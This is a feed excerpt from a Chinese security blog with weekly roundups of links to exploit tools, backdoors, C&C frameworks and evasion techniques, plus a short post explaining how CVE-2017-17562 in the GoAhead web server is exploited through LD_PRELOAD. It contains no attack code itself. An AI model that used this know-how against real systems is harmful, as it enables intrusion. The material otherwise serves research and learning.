<li>security-apis - 安全相关服务的公共 JSON API 收集列表<br><a href="https://github.com/deralexxx/security-apis" target="_blank" rel="external">https://github.com/deralexxx/security-apis</a></li>
<li>WAF Evasion Techniques<br><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" target="_blank" rel="external">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a><br><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="external">https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0</a></li>
<li>ews-crack - Exchange ews 接口的暴力破解脚本<br><a href="https://github.com/mikesiegel/ews-crack" target="_blank" rel="external">https://github.com/mikesiegel/ews-crack</a></li>
<li>Windows 平台利用 NTFS ADS 实现隐藏数据的方法<br><a href="http://www.darknessgate.com/security-tutorials/date-hiding/ntfs-alternate-data-streams/" target="_blank" rel="external">http://www.darknessgate.com/security-tutorials/date-hiding/ntfs-alternate-data-streams/</a></li>
<li>渗透测试中的 Go 语言使用：编写反弹后门 Hershell<br><a href="https://sysdream.com/news/lab/2018-01-15-en-golang-for-pentests-hershell/" target="_blank" rel="external">https://sysdream.com/news/lab/2018-01-15-en-golang-for-pentests-hershell/</a></li>
<li>腾讯2017年度网络黑产威胁源研究报告<br><a href="https://book.yunzhan365.com/odqt/yzzl/mobile/index.html#p=1" target="_blank" rel="external">https://book.yunzhan365.com/odqt/yzzl/mobile/index.html#p=1</a></li>
<li>成为 THreat hunter,用 KOLIDE FLEET、OSQUERY、POWERSHELL EMPIRE 以及 CALDERA 搭建威胁狩猎环境<br><a href="https://holdmybeersecurity.com/2018/01/16/part-2a-intro-to-threat-hunting-with-kolide-fleet-osquery-powershell-empire-and-caldera-setup-environment/" target="_blank" rel="external">https://holdmybeersecurity.com/2018/01/16/part-2a-intro-to-threat-hunting-with-kolide-fleet-osquery-powershell-empire-and-caldera-setup-environment/</a></li>
<li>awesome-threat-detection - 威胁检测与追击方面的资源集<br><a href="https://github.com/0x4D31/awesome-threat-detection" target="_blank" rel="external">https://github.com/0x4D31/awesome-threat-detection</a></li>
<li>Linux 堆溢出漏洞利用系列之 libc 2.23/2.24 vfprintf 的 Double Free 漏洞分析<br><a href="https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-bonus-printf-might-be-leaking/" target="_blank" rel="external">https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-bonus-printf-might-be-leaking/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;RPO攻击技术浅析&lt;br&gt;&lt;a href=&quot;http://blog.nsfocus.net/rp
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180103安全动态</title>
    <link href="http://kevien.github.io/2018/01/03/20180103%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/01/03/20180103安全动态/</id>
    <published>2018-01-03T14:38:35.000Z</published>
    <updated>2018-01-05T06:47:55.856Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>RSAP技术分析<br><a href="http://blog.nsfocus.net/rsap-tech/" target="_blank" rel="external">http://blog.nsfocus.net/rsap-tech/</a></li>
<li>ropchain：ASLR + DEP + stack canaries 绕过<br><a href="http://www.kvakil.me/posts/ropchain/" target="_blank" rel="external">http://www.kvakil.me/posts/ropchain/</a></li>
<li>Command and Control - Images，在图片中隐藏命令和 Payload 实现 C&amp;C 控制<br><a href="https://pentestlab.blog/2018/01/02/command-and-control-images/" target="_blank" rel="external">https://pentestlab.blog/2018/01/02/command-and-control-images/</a></li>
<li>wifiphisher - 自动化 WiFi 钓鱼工具<br><a href="https://github.com/wifiphisher/wifiphisher" target="_blank" rel="external">https://github.com/wifiphisher/wifiphisher</a></li>
<li>追查黑客行为：发现与检测横向渗透的方法<br><a href="https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf" target="_blank" rel="external">https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf</a></li>
<li>safe-commit-hook - Git pre-commit hook，在提交前检测本次提交是否包含敏感文件<br><a href="https://github.com/jandre/safe-commit-hook" target="_blank" rel="external">https://github.com/jandre/safe-commit-hook</a></li>
<li><p>基于 Web 控制的 C&amp;C 后门 - Ares 的介绍<br><a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/" target="_blank" rel="external">https://pentestlab.blog/2018/01/03/command-and-control-web-interface/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">控制端用web还是挺创新的，只是感觉不如传统的功能多，且会被大多杀软查杀。</div></pre></td></tr></table></figure>
</li>
<li><p>explodingcan - IIS WebDav 远程溢出漏洞利用程序（CVE-2017-7269）<br><a href="https://github.com/danigargu/explodingcan" target="_blank" rel="external">https://github.com/danigargu/explodingcan</a></p>
</li>
<li>python http.server open redirect vulnerability<br><a href="https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</a></li>
<li>Cloak is an intelligent python backdoor framework.<br><a href="https://github.com/UltimateHackers/Cloak" target="_blank" rel="external">https://github.com/UltimateHackers/Cloak</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">其实就是向python脚本中插入加密代码</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;RSAP技术分析&lt;br&gt;&lt;a href=&quot;http://blog.nsfocus.net/rsa
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171225安全动态</title>
    <link href="http://kevien.github.io/2017/12/25/20171225%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/12/25/20171225安全动态/</id>
    <published>2017-12-24T16:50:53.000Z</published>
    <updated>2018-01-13T15:16:25.629Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Linux 上 ELF 可执行文件的理解与分析<br><a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="external">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></li>
<li>加固 C / C ++ 程序 Part 1 - 堆栈保护器<br>&lt; <a href="http://www.productive-cpp.com/hardening-cpp-programs-stack-protector/&gt;" target="_blank" rel="external">http://www.productive-cpp.com/hardening-cpp-programs-stack-protector/&gt;</a><br><a href="http://www.productive-cpp.com/hardening-cpp-programs-executable-space-protection-address-space-layout-randomization-aslr/" target="_blank" rel="external">http://www.productive-cpp.com/hardening-cpp-programs-executable-space-protection-address-space-layout-randomization-aslr/</a></li>
<li>利用 Docker 构建命令控制服务器<br><a href="https://blog.obscuritylabs.com/docker-command-controll-c2/" target="_blank" rel="external">https://blog.obscuritylabs.com/docker-command-controll-c2/</a></li>
<li>Java 应用程序中是如何发生内存泄漏的<br><a href="https://stackify.com/memory-leaks-java/" target="_blank" rel="external">https://stackify.com/memory-leaks-java/</a></li>
<li>fuzzing 入门指南<br>&lt; <a href="https://fuzzing-project.org/tutorial1.html&gt;" target="_blank" rel="external">https://fuzzing-project.org/tutorial1.html&gt;</a></li>
<li>代码签名证书的克隆攻击与防御<br><a href="https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec" target="_blank" rel="external">https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec</a></li>
<li>Linux 堆利用系列之Double free attacks<br><a href="https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-riding-free-on-the-heap-double-free-attacks/" target="_blank" rel="external">https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-riding-free-on-the-heap-double-free-attacks/</a></li>
<li><p>parameth - GET / POST 参数暴力破解工具<br><a href="https://github.com/maK-/parameth" target="_blank" rel="external">https://github.com/maK-/parameth</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">某天可能会用到</div></pre></td></tr></table></figure>
</li>
<li><p>jexboss - Jboss 及 Java 反序列化漏洞利用工具:<br><a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="external">https://github.com/joaomatosf/jexboss</a></p>
</li>
<li><p>Botconf 2017 大部分议题材料已经放出<br><a href="https://www.botconf.eu/botconf-2017/programme/botconf-2017-talks/" target="_blank" rel="external">https://www.botconf.eu/botconf-2017/programme/botconf-2017-talks/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">有几个议题不错啊</div></pre></td></tr></table></figure>
</li>
<li><p>2017 Mac 恶意软件盘点<br><a href="https://objective-see.com/blog/blog_0x25.html" target="_blank" rel="external">https://objective-see.com/blog/blog_0x25.html</a></p>
</li>
<li>基于 Windows 的日志转发（Event Forwarding）和微软的交互式数据可视化 BI 工具 Power BI 构建一个高效、免费的威胁发现、应急响应平台<br><a href="https://blogs.technet.microsoft.com/jepayne/2017/12/08/weffles/" target="_blank" rel="external">https://blogs.technet.microsoft.com/jepayne/2017/12/08/weffles/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Linux 上 ELF 可执行文件的理解与分析&lt;br&gt;&lt;a href=&quot;https://linu
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>有关CVE-2017-17562的一些零碎点</title>
    <link href="http://kevien.github.io/2017/12/24/CVE-2017-17562%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9B%B6%E7%A2%8E%E7%82%B9/"/>
    <id>http://kevien.github.io/2017/12/24/CVE-2017-17562的一些零碎点/</id>
    <published>2017-12-24T08:10:00.000Z</published>
    <updated>2018-01-19T10:57:08.477Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1247)以及shellshock漏洞(CVE-2014-6271),前两天只是简单的看了一下，今天有时间就整理一下，留个备忘。</li>
<li>goAHead是一个使用c语言实现的一个简单web服务器，主要用在嵌入式设备上，官方给出的一句话描述也是simple，secure Embedded web server，官方说有亿万的设备在使用(夸张了吧？)，其中有像是hp、oracle、西门子、摩托罗拉等。详细可以看向这里<a href="https://embedthis.com/goahead/" target="_blank" rel="external">https://embedthis.com/goahead/</a><h4 id="CVE-2016-1247简单介绍"><a href="#CVE-2016-1247简单介绍" class="headerlink" title="CVE-2016-1247简单介绍"></a>CVE-2016-1247简单介绍</h4></li>
<li>这个漏洞可以导致GoAhead web服务器在小于3.6.5版本远程代码执行。攻击者通过发送一个恶意的http请求，利用开启了CGI功能的goAhead的服务器，从而进行远程代码执行。其中exp是利用到了向新的进程中注入环境变量这种比较基本的攻击方式。<br></li>
<li>具体需要的条件主要有如下：<br><br>1.GoAhead开启CGI功能，即有cgi的处理页面(关于GoAhead cgi的使用可以看向这里<a href="https://embedthis.com/goahead/doc/users/cgi.html" target="_blank" rel="external">https://embedthis.com/goahead/doc/users/cgi.html</a>)<br>2.需要GoAhead版本低于3.6.5<br>3.需要动态链接glibc库(默认是动态链接的)<h4 id="具体"><a href="#具体" class="headerlink" title="具体"></a>具体</h4></li>
<li>在英文原版文章中作者已经分析了glibc是如何加载和处理环境变量、GoAhead如何处理cgi以及linux的procfs的符号链接如何指向输入描述符等，我这里就不细分析了。下面只是放几张测试的图片。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/origin.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/poc.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/afterpoc.png" alt=""><br>(a.html extract from wireshark)<br>可以看到，打过payload之后，页面返回的环境变量多了一个LD_PRELOAD=/proc/self/fd/0的键值对。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/proc.png" alt=""><br>可以看到，cgi处理进程符号链接指向的tmp文件和我们的payload是相同的。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
<li>这个漏洞利用的难点在于怎么将动态链接库注入到远程服务器，作者这里提供了一个很好的思路就是利用到了/proc/self/fd/0（它对应了文件的stdin文件描述符）这个文件就链接到了我们上传的文件</li>
<li>就像英文原版文章的标题一样，这个漏洞的精髓就是利用ld_preload来进行exploit，这个思路很新颖，后面可能会有其它的漏洞用到这个思路和方法。<h4 id="漏洞引申1-有关nginx提权"><a href="#漏洞引申1-有关nginx提权" class="headerlink" title="漏洞引申1-有关nginx提权"></a>漏洞引申1-有关nginx提权</h4></li>
<li>漏洞分析文章见这里<br><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="external">Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">作者的poc shell脚本写的不错</div></pre></td></tr></table></figure>
</li>
</ul>
<p><a href="http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/" target="_blank" rel="external">Nginx权限提升漏洞(CVE-2016-1247) 分析</a></p>
<ul>
<li>之前简单研究过nginx的提权漏洞，和这次的漏洞有一些像，也用到了环境变量，nginx的这个漏洞用到了写入恶意动态链接库路径到/etc/ld.so.preload。<h4 id="漏洞引申2-有关shellshock"><a href="#漏洞引申2-有关shellshock" class="headerlink" title="漏洞引申2-有关shellshock"></a>漏洞引申2-有关shellshock</h4></li>
<li>对比shellshock，这个漏洞要需要的条件苛刻很多，shellshock简单粗暴，而且shellshock的影响范围也更广。<br><a href="http://www.vuln.cn/6476" target="_blank" rel="external">Shellshock漏洞回顾与分析测试 - Debug_Orz</a><h4 id="漏洞引申3-其它"><a href="#漏洞引申3-其它" class="headerlink" title="漏洞引申3-其它"></a>漏洞引申3-其它</h4></li>
<li>在github上看这个项目的一些cve issue <br><br><a href="https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed" target="_blank" rel="external">https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed</a><br><br>还是有很多东西值得学习的(基本上可以看到开发一个web服务器可能会遇到的安全问题）<br><br>比如这个issue <a href="https://github.com/embedthis/goahead/issues/241" target="_blank" rel="external">https://github.com/embedthis/goahead/issues/241</a>中，某位安全研究员提的报告<br><a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html" target="_blank" rel="external">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</a></li>
<li>As I’m a fan of looking at the source    –author <br><br>向作者学习，安全有个好处就是我们可以透过现象看本质，研究原理很有意思。</li>
<li>有关patch，原文中作者也说了，漏洞的修复只是过滤了几个特殊的参数名，有可能会被绕过，期待大牛们绕过的思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="external">REMOTE LD_PRELOAD EXPLOITATION</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171218安全动态</title>
    <link href="http://kevien.github.io/2017/12/18/20171218%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/12/18/20171218安全动态/</id>
    <published>2017-12-18T06:23:28.000Z</published>
    <updated>2017-12-20T11:41:54.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>漏洞利用缓解技术之数据执行保护(DEP)<br><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634" target="_blank" rel="external">https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634</a></li>
<li>SHADOW ON THE WALL - Shadowsocks 流量的检测、解密、与命令执行漏洞<br><a href="https://x41-dsec.de/security/news/2017/12/18/x41-shadow-on-the-wall/" target="_blank" rel="external">https://x41-dsec.de/security/news/2017/12/18/x41-shadow-on-the-wall/</a></li>
<li>基于r2的逆向基础 radare2<br><a href="https://sec.xiaomi.com/article/30" target="_blank" rel="external">https://sec.xiaomi.com/article/30</a></li>
<li><p>shell中&gt;/dev/null 2&gt;&amp;1是什么鬼？<br><a href="http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/" target="_blank" rel="external">http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学习了</div></pre></td></tr></table></figure>
</li>
<li><p>Invoke-Obfuscation 用例指南 Part 2<br><a href="http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2" target="_blank" rel="external">http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2</a></p>
</li>
<li>merlin - 使用 HTTP 通信的跨平台后渗透测试工具<br><a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="external">https://github.com/Ne0nd0g/merlin</a></li>
<li>ropa - 基于 Ropper 实现的一个 GUI 版本的 ROP 链构造工具<br><a href="https://github.com/orppra/ropa" target="_blank" rel="external">https://github.com/orppra/ropa</a></li>
<li>remote ld_preload exploitation<br><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="external">https://www.elttam.com.au/blog/goahead/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;漏洞利用缓解技术之数据执行保护(DEP)&lt;br&gt;&lt;a href=&quot;https://0x00sec
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171211安全动态</title>
    <link href="http://kevien.github.io/2017/12/11/20171211%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/12/11/20171211安全动态/</id>
    <published>2017-12-11T05:25:10.000Z</published>
    <updated>2017-12-16T10:01:11.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Exploiting Techniques \000 - ret2libc<br><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833" target="_blank" rel="external">https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833</a></li>
<li>Linux Kernel 4.10.5 / <4.14.3 43234="" (ubuntu)="" dccp="" socket="" uaf="" 漏洞利用="" (cve-2017-8824)="" <https:="" www.exploit-db.com="" exploits=""></4.14.3></li>
<li>macOS 10.13.1 系统中，如果我们有能力改写任何不受 SIP 保护的文件，但是改写后的属主不是 ROOT。这种条件下如何实现进一步利用提权，作者想到的方法是：cron<br><a href="https://m4.rkw.io/blog/macos-high-sierra-10131-insecure-cron-system.html" target="_blank" rel="external">https://m4.rkw.io/blog/macos-high-sierra-10131-insecure-cron-system.html</a></li>
<li>BootStomp - bootloader 漏洞扫描工具<br><a href="https://github.com/ucsb-seclab/BootStomp" target="_blank" rel="external">https://github.com/ucsb-seclab/BootStomp</a></li>
<li>网络协议分析中常见协议分析、常用工具使用手册<br><a href="http://packetlife.net/library/cheat-sheets/" target="_blank" rel="external">http://packetlife.net/library/cheat-sheets/</a></li>
<li>VMware Guest-&gt;Host 虚拟机逃逸漏洞案例的总结报告，来自 BlackHat Europe 2017 会议：<br><a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Mandal-The-Great-Escapes-Of-Vmware-A-Retrospective-Case-Study-Of-Vmware-G2H-Escape-Vulnerabilities.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/eu-17/materials/eu-17-Mandal-The-Great-Escapes-Of-Vmware-A-Retrospective-Case-Study-Of-Vmware-G2H-Escape-Vulnerabilities.pdf</a></li>
<li>Process Doppelgänging - 有研究员提出的一种新的无文件恶意软件杀软逃逸技术。其利用 Windows NTFS Transactions 结合 Windows Loader 实现对合法进程的替换<br><a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf</a></li>
<li>无需 powershell.exe，仅用一个 .csv 实现远程 Shell<br><a href="https://twitter.com/i/web/status/939215702073991168" target="_blank" rel="external">https://twitter.com/i/web/status/939215702073991168</a></li>
<li>如何为 PE 可执行文件实现加壳和数据混淆<br><a href="https://0x00sec.org/t/packers-executable-compression-and-data-obfuscation/847" target="_blank" rel="external">https://0x00sec.org/t/packers-executable-compression-and-data-obfuscation/847</a></li>
<li>bypass_waf - waf自动爆破(绕过)工具<br><a href="https://github.com/3xp10it/bypass_waf" target="_blank" rel="external">https://github.com/3xp10it/bypass_waf</a></li>
<li>heapwn - 安全研究人员 xerof4ks 的堆利用学习集锦<br><a href="https://github.com/xerof4ks/heapwn" target="_blank" rel="external">https://github.com/xerof4ks/heapwn</a></li>
<li>利用 Sysinternals Sysmon 监控进程的可疑行为，来自微软 Blog<br><https: 12="" 2017="" blogs.technet.microsoft.com="" motiba="" 07="" sysinternals-sysmon-suspicious-activity-guide=""></https:></li>
<li>漏洞利用中的堆内存布局优化技巧实战，来自 BlackHat Europe 2017 会议<br><a href="https://seanhn.files.wordpress.com/2017/12/eu-17-heelan-heap-layout-optimisation-for-exploitation1.pdf" target="_blank" rel="external">https://seanhn.files.wordpress.com/2017/12/eu-17-heelan-heap-layout-optimisation-for-exploitation1.pdf</a></li>
<li>通过静态分析检测二进制代码中的 Use-After-Free 漏洞<br><a href="http://blog.amossys.fr/intro-to-use-after-free-detection.html" target="_blank" rel="external">http://blog.amossys.fr/intro-to-use-after-free-detection.html</a></li>
<li>ProcessRefund - 一种新的无文件恶意软件杀软逃逸技术 - Process Doppelgänging，今天研究员在 GitHub 上分享了一个 PoC 代码<br><a href="https://github.com/Spajed/processrefund" target="_blank" rel="external">https://github.com/Spajed/processrefund</a></li>
<li>makin - 用于探测恶意样本反调试技术的工具<br><a href="https://github.com/secrary/makin" target="_blank" rel="external">https://github.com/secrary/makin</a></li>
<li>ADRecon - 活动目录信息收集工具<br><a href="https://github.com/sense-of-security/ADRecon" target="_blank" rel="external">https://github.com/sense-of-security/ADRecon</a></li>
<li>retdec - Avast 团队开源的用于分析 ELF/PE/Mach-O 的静态分析工具<br><a href="https://github.com/avast-tl/retdec" target="_blank" rel="external">https://github.com/avast-tl/retdec</a></li>
<li>Windows Credential Manager 是怎么保存密码的<br><a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials</a></li>
<li>TensorFlow自动识别验证码（二）<br><a href="https://mp.weixin.qq.com/s/sbB-gllD_iAzxPGJEETVuQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/sbB-gllD_iAzxPGJEETVuQ</a></li>
<li>SCF 文件攻击方式介绍<br><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" target="_blank" rel="external">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></li>
<li>Bypass AppLocker 的 30 种方法<br><a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="external">https://github.com/api0cradle/UltimateAppLockerByPassList</a></li>
<li>游戏安全系列教程-植物大战僵尸<br><a href="https://bbs.ichunqiu.com/thread-30298-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-30298-1-1.html</a></li>
<li>使用递归攻击未初始化变量<br><a href="https://mp.weixin.qq.com/s/HKybdHS-ewegqoDMxMHyhg" target="_blank" rel="external">https://mp.weixin.qq.com/s/HKybdHS-ewegqoDMxMHyhg</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Exploiting Techniques \000 - ret2libc&lt;br&gt;&lt;a href
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171204安全动态</title>
    <link href="http://kevien.github.io/2017/12/04/20171204%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/12/04/20171204安全动态/</id>
    <published>2017-12-04T05:42:02.000Z</published>
    <updated>2017-12-16T06:21:33.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>编写简单 Linux 内核模块的实例<br><a href="https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234" target="_blank" rel="external">https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234</a></li>
<li>XXE OOB extracting via HTTP+FTP using single opened port<br><a href="https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/" target="_blank" rel="external">https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/</a></li>
<li>ProcessIsolator - Hook SSDT 将控制权交给用户态程序实现访问控制（允许/拒绝）的工具<br><a href="https://github.com/int0/ProcessIsolator" target="_blank" rel="external">https://github.com/int0/ProcessIsolator</a></li>
<li>钓鱼邮件威胁检测实战及典型样本分析<br><a href="https://www.anquanke.com/post/id/88145" target="_blank" rel="external">https://www.anquanke.com/post/id/88145</a></li>
<li><p>由结构体对齐所引发的对C++类对象内存模型的思考<br><a href="https://bbs.pediy.com/thread-222967.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-222967.htm</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Nice</div></pre></td></tr></table></figure>
</li>
<li><p>通过在函数 Prologue 部分检测 0xE9 (opcode JMP) 实现对 Inline Hook 的检测<br><a href="https://userpc.net/2017/12/03/understanding-detecting-inline-hooks-winapi-hooks-ring3/" target="_blank" rel="external">https://userpc.net/2017/12/03/understanding-detecting-inline-hooks-winapi-hooks-ring3/</a></p>
</li>
<li>Windows Defender ATP 利用机器学习和 AMSI 接口对抗基于脚本的攻击<br><a href="https://blogs.technet.microsoft.com/mmpc/2017/12/04/windows-defender-atp-machine-learning-and-amsi-unearthing-script-based-attacks-that-live-off-the-land/?platform=hootsuite" target="_blank" rel="external">https://blogs.technet.microsoft.com/mmpc/2017/12/04/windows-defender-atp-machine-learning-and-amsi-unearthing-script-based-attacks-that-live-off-the-land/?platform=hootsuite</a></li>
<li>微软关于 Windows 特权访问防护的手册，其中介绍了不同的登陆类型（console、RUNAS、Remote Desktop、Net use * \SERVER 等等）及其限制<br><https: docs.microsoft.com="" en-us="" windows-server="" identity="" securing-privileged-access="" securing-privileged-access-reference-material#atlt_bm=""></https:></li>
<li>逆向工程师一直受到汇编垃圾代码（Junk Code）的折磨，FireEye 这篇 Blog 介绍如何识别 Junk Code<br><a href="https://www.fireeye.com/blog/threat-research/2017/12/recognizing-and-avoiding-disassembled-junk.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2017/12/recognizing-and-avoiding-disassembled-junk.html</a></li>
<li>堆利用之单字节溢出（off-by-one）<br><a href="https://www.anquanke.com/post/id/88961" target="_blank" rel="external">https://www.anquanke.com/post/id/88961</a></li>
<li><p>警惕Ubuntu APT源污染<br><a href="https://paper.seebug.org/270/" target="_blank" rel="external">https://paper.seebug.org/270/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">像是yum brew apt nuget pip npm等这些安装依赖的工具，进行攻击作为研究角维度</div></pre></td></tr></table></figure>
</li>
